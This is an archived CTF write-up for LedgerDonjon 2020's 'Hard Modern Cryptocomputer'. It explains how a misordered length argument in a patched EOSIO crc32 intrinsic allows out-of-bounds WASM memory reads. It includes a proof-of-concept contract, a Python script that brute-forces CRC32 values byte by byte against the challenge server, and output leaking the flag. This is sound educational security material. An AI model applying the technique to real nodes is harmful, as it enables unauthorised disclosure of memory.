# hard-modern-cryptocomputer

**CTF:** LedgerDonjon 2020  
**Category:** misc  
**Original writeup:** <https://blog.cryptohack.org/hacking-eos-ledger-donjon-ctf-writeup> — by **blog.cryptohack.org**. All credit goes to the original author; this is an archived copy.

---

Hard Modern Cryptocomputer (500pts)

Normal users are not able to read the secret embedded in the WASM virtual machine. Can you leak it? You need to solve “Easy Modern Cryptocomputer” before this challenge.

The easy version of the challenge had got us up to the point where we were calling the contract, but we hadn’t even exploited anything in the node patch yet, so naturally we reckoned that was the next place to look.

However, it was unclear how we could access the flag. Would we need escalate to a privileged user? Break out of the WASM sandbox and print out the flag from the stack? Overflow the buffer in the provided contract to leak the flag in memory?

One of the first things we noticed was that get_secret_flag is explicitly using ::memcpy , the memcpy in the top-level namespace, rather than a potentially customized memcpy of EOS (it turned out that the “custom” memcpy version we saw was actually an intrinsic being exposed to wasm). After testing this and some other simple ideas, we didn’t get very far.

Slowly, we became more confident that the exploit had to involve CRC32 over arbitrary memory locations. Since the crc32 function was a feature of the patched nodes, we could write our own smart contract and call it. But how to abuse this ability? The function looked fine, its API seemingly not too different from other intrinsic hash functions, and we were unable to find any useful resources about the EOSIO WASM sandbox or previous exploitation work on it.

Looking further at differences that might set the crc32 function apart from intrinsics such as the sha256 function, we finally identified something suspicious: the function signature.

uint32_t crc32 ( array_ptr < char > data , uint32_t value , uint32_t datalen )

It’s not immediately obvious, but in all other intrinsics, the datalen directly followed data as an argument. For the intrinsic hash functions, since the only other argument was an output variable, this was easy to miss.

But, when we dived deeper into the definition for array_ptr , we found this:

/** * class to represent an in-wasm-memory array * it is a hint to the transcriber that the next parameter will * be a size (in Ts) and that the pair are validated together * This triggers the template specialization of intrinsic_invoker_impl * @tparam T */ template < typename T > inline array_ptr < T > array_ptr_impl ( size_t ptr , size_t length )

Jackpot! Rather unintuitively, the array_ptr type must be followed by its length parameter, and these values are validated together. This was surprising to us as the usual pattern for this is to combine a buffer and its length in a struct when this kind of validation is important.

What does this give us? It means that we can call crc32 with data pointing to memory inside the WASM sandbox during execution of a contract, value set to 0, and datalen set to an arbitrary length. Then we can keep reading forwards in memory and taking the CRC32. We can bruteforce CRC32 one value at a time to get memory reads that wouldn’t normally be possible, since the data pointer plus the length would spill into memory not allocated for the contract. It’s not quite an arbitrary memory read, but it was progress.

We wrote a quick contract to validate that our idea indeed worked:

#include <eosio/eosio.hpp> #include <eosio/crypto.hpp> using namespace eosio ; extern "C" [[ eosio :: wasm_import ]] uint32_t crc32 ( const char * , uint32_t , uint32_t ); extern "C" [[ eosio :: wasm_import ]] uint32_t get_secret_flag ( const char * , uint32_t ); class [[ eosio :: contract ]] pwn : public contract { public: using contract :: contract ; [[ eosio :: action ]] void pwn ( name user ) { const char * ptr = "bla" ; int out = crc32 ( ptr , 0 , 65537 ); print ( out ); } };

Executing this, we could read some weird stuff in memory after the char pointer.

But then we got stuck. How to get the flag? Since it’s an environment variable, it’ll be on the stack, but we can still only read allocated memory pages, accessing anything else would result in a segfault. The wasm memory is presumably allocated somewhere on the heap, while the flag is somewhere on the stack, and we’re pretty much guaranteed that these will not be contiguous. Trying to reach the stack from where we can start would both be impossible due to the segfaults, as well as being infeasible due to requiring a linear scan over the in-between memory for every byte we can leak.

Interested in how the wasm memory is managed, and where exactly it can be found - still somehow hoping we could get close to the stack somewhere - we dug deeper into the EOS source. With noticeable surprise on our faces, we soon realised that the wasm memory area Memory::data is a static member (which would also immediately mean that multiple wasm programs cannot or should not be executed in parallel). This implies that the same memory location might be consistent across multiple calls, and hopefully (from an attacker’s perspective) isn’t immediately cleared in between runs.

Looking at the source, we saw that all the memory that is used or reserved is cleared or initialized, but if the std::vector is shrunk relative to the last call, it is hopefully not reallocated, and the old data extending past our “fences” is not cleared. Perhaps we could first run the other contract that called the privileged get_secret_flag , then read some remnants of memory it left behind? We shouldn’t normally be allowed to access that memory due to the in-WASM protections, but we had already found a way to evade them. That would also explain why the flag was loaded into memory at such a specific address (0x10000) by the other contract: that was exactly one wasm memory page, the unit in which the wasm memory is measured. We could make sure our own contract needed only a single page, and then read out of bounds from the remnants of the privileged contract on the second page.

We wrote a Python script for bruting memory reads one deployed contract at a time, and pointed it at our last accessible memory address before 0x10000. Note that it could be faster by doing the bruteforce inside the contract itself; but the code was sufficient to get the flag in a few minutes so there was no need to optimise:

import binascii import subprocess from subprocess import PIPE contract = """ #include <eosio/eosio.hpp> #include <eosio/crypto.hpp> using namespace eosio; extern "C" [[eosio::wasm_import]] uint32_t crc32(const char*, uint32_t, uint32_t); extern "C" [[eosio::wasm_import]] uint32_t get_secret_flag(const char*, uint32_t); class [[eosio::contract]] pwn : public contract { public: using contract::contract; [[eosio::action]] void pwn(name user) { const char *ptr = (char *)0xffff; uint32_t out = crc32(ptr, 0, POSITION); print(out); } }; """ def publish_contract ( contract ): with open ( "pwn.cpp" , 'w' ) as f : f . write ( contract ) subprocess . run ([ "eosio-cpp" , "pwn.cpp" , "-o" , "pwn.wasm" ]) subprocess . run ([ "cleos" , "-u" , "http://modern-cryptocomputer.donjon-ctf.io:61775/" , "set" , "contract" , "maze" , "/opt/eosio/contracts/pwn/" , "-p" , "maze@active" ]) subp = subprocess . run ([ "cleos" , "-u" , "http://modern-cryptocomputer.donjon-ctf.io:61775/" , "push" , "action" , "maze" , "hi" , '["maze"]' , "-p" , "maze@active" ], stdout = PIPE , stderr = PIPE ) print ( subp . stdout ) print ( subp . stderr ) output = subp . stdout . strip (). split ( b "

" ) crc_res = output [ - 1 ]. replace ( b ">" , b "" ) crc_res = int ( crc_res ) print ( crc_res ) return crc_res curr = b "" pos = 0 while True : pos += 1 contract2 = contract . replace ( "POSITION" , str ( pos )) crc_target = publish_contract ( contract2 ) for i in range ( 256 ): temp = curr + bytes ([ i ]) out = binascii . crc32 ( temp ) if out == crc_target : curr = curr + bytes ([ i ]) print ( curr ) break

The output of the script shows the flag appearing character by character:

Warning, empty ricardian clause file Warning, empty ricardian clause file Warning, action <hi> does not have a ricardian contract Reading WASM from /opt/eosio/contracts/pwn/pwn.wasm... Skipping set abi because the new abi is the same as the existing abi Publishing contract... executed transaction: 895079151c7c45b53a3f7df03d4ab3b39c2cd7aa9152d545a2c6ce4c5eb117cf 632 bytes 1522 us # eosio <= eosio::setcode {"account":"maze","vmtype":0,"vmversion":0,"code":"0061736d0100000001370b6000017f60027f7f0060037f7f7... warning: transaction executed locally, but may not be confirmed by the network yet ] b'# maze <= maze::hi {"user":"maze"}

>> 9020020

' b'executed transaction: 8764d941196b9d4cb4ad979d3ff08aa1b9c998aeb1c9343be6bbe8b7a4bbb121 104 bytes 374 us

warn 2020-11-08T22:36:55.034 cleos main.cpp:513 print_resul t ] \rwarning: transaction executed locally, but may not be confirmed by the network yet

' 9020020 b'CTF{S3cur1ty_with_C++_TeM' Warning, empty ricardian clause file Warning, empty ricardian clause file Warning, action <hi> does not have a ricardian contract Reading WASM from /opt/eosio/contracts/pwn/pwn.wasm... Skipping set abi because the new abi is the same as the existing abi Publishing contract... executed transaction: 2583b751da8d72a671d46d1be67bcb0fcd5dfaa9984991d1e20a6ae86b74ac08 632 bytes 1456 us # eosio <= eosio::setcode {"account":"maze","vmtype":0,"vmversion":0,"code":"0061736d0100000001370b6000017f60027f7f0060037f7f7... warning: transaction executed locally, but may not be confirmed by the network yet ] b'# maze <= maze::hi {"user":"maze"}

>> 3580863030

' b'executed transaction: 1df65b055bce13b4932d3d9c6f2b30c9dee82ff818833c6be8b1c9d9c8604c41 104 bytes 487 us

warn 2020-11-08T22:37:00.550 cleos main.cpp:513 print_resul t ] \rwarning: transaction executed locally, but may not be confirmed by the network yet

' 3580863030 b'CTF{S3cur1ty_with_C++_TeMp'
